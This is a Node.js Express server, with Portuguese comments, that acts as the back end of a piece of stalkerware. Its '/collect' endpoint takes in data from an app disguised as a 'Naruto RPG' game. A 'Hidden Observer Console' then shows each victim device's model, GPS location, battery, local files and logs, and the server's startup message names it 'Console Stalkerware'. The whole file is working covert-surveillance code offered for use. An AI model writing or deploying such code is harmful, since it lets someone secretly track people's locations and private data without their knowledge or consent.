const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

// Armazenamento em memória (para produção, use um banco de dados)
let collectedData = [];

// Endpoint para receber dados do app
app.post('/collect', (req, res) => {
  const data = req.body;
  data.receivedAt = new Date().toISOString();
  collectedData.push(data);
  console.log('Novo dado recebido:', data.deviceInfo);
  res.status(200).json({ success: true });
});

// Endpoint para o console web buscar dados atualizados
app.get('/api/data', (req, res) => {
  res.json(collectedData);
});

// Servir o console web
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Naruto RPG: Hidden Console</title>
      <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }
        h1 { color: #ff0; text-shadow: 0 0 10px #ff0; }
        .card { border: 1px solid #0f0; padding: 15px; margin-bottom: 15px; background: #111; }
        .log { color: #0ff; font-size: 0.9em; }
        .status { color: #f00; font-weight: bold; }
      </style>
    </head>
    <body>
      <h1>🌪️ Hidden Observer Console</h1>
      <p>Status: <span class="status">ONLINE</span> | Atualização automática a cada 5s</p>
      <div id="container">
        <p>Aguardando dados do dispositivo...</p>
      </div>
      <script>
        function updateConsole() {
          fetch('/api/data')
            .then(res => res.json())
            .then(data => {
              const container = document.getElementById('container');
              if (data.length === 0) {
                container.innerHTML = '<p>Aguardando dados do dispositivo...</p>';
                return;
              }
              // Mostra apenas os últimos 10 registros
              const latest = data.slice(-10).reverse();
              container.innerHTML = latest.map((item, i) => \`
                <div class="card">
                  <h3>Dispositivo #\${data.length - i} - \${new Date(item.receivedAt).toLocaleTimeString()}</h3>
                  <p><strong>Modelo:</strong> \${item.deviceInfo.model} (iOS \${item.deviceInfo.iosVersion})</p>
                  <p><strong>Localização:</strong> \${item.location ? item.location.latitude + ', ' + item.location.longitude : 'N/A'}</p>
                  <p><strong>Bateria:</strong> \${item.deviceInfo.batteryLevel}%</p>
                  <p><strong>Arquivos Locais:</strong> \${item.localFiles.length} encontrados</p>
                  <div class="log">
                    <strong>Logs:</strong>
                    <ul>\${item.logs.map(log => '<li>' + log + '</li>').join('')}</ul>
                  </div>
                </div>
              \`).join('');
            })
            .catch(err => console.error('Erro ao atualizar console:', err));
        }
        setInterval(updateConsole, 5000);
        updateConsole();
      </script>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log(`Console Stalkerware rodando em http://localhost:${port}`);
});